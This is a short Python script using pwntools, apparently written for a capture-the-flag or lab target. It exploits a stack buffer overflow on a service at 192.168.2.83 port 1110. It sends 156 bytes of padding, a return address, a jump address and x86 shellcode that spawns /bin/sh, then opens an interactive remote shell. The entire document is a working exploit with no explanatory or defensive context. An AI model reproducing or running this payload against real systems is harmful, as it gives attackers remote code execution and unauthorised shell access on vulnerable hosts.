from pwn import *

junk = "A" * 156
jmp = 0x08048431
ret = 0x08048436
shell_code = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
p = remote("192.168.2.83", "1110")

in_str =  junk + p32(ret) + p32(jmp) + shell_code

p.sendline(in_str)
p.interactive()